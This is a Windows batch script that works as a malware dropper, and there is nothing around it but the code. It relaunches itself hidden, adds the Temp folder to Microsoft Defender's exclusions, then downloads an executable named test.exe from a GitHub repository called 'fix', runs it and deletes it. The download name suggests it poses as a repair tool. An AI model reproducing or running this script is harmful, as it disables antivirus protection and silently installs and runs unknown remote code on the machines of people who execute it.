@echo off
if "%1"=="hide" goto :hide
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hide' -WindowStyle Hidden"
exit
:hide
set "TEMP=%USERPROFILE%\AppData\Local\Temp"
powershell -Command "Add-MpPreference -ExclusionPath \"%TEMP%\" -ErrorAction SilentlyContinue"
curl -L -o "%TEMP%\test.exe" "https://github.com/Nphuc1503/fix/raw/refs/heads/main/test.exe"
start /wait "" "%TEMP%\test.exe"
del /f /q "%TEMP%\test.exe"
exit